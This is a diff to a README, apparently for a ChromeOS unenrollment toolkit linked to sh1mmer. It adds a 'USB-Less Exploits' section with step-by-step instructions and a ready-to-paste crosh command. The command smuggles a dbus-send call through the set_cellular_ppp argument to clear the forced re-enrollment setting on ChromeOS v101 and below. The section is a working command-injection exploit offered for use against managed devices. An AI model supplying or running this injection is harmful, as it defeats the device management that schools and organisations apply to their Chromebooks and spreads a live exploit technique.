@@ -80,3 +80,15 @@ So first get your Br0ker shim from here: https://github.com/ading2210/sh1mmer/re
 
 # Credits:
 # Mercury Workshop Team, ading2210, FWNavy, BinBashBannana and Crosbreaker
+
+
+
+# USB-Less Exploits:
+KERNVER 1, REQUIRES ChromeOS v101 and below: SHroot
+1. open crosh, (ctrl+alt+t)
+2. paste the following in:
+3. ```set_cellular_ppp \';dbus-send${IFS}--system${IFS}--print-reply${IFS}--dest=org.chromium.SessionManager${IFS}/org/chromium/SessionManager${IFS}org.chromium.SessionManagerInterface.ClearForcedReEnrollmentVpd;exit;\'```
+4. press enter
+5. Just like this:
+
+6. <img width="1217" height="216" alt="crosh-rootesc" src="https://github.com/user-attachments/assets/9ab2be14-337d-468a-bcc6-ee9a950e42f4" />
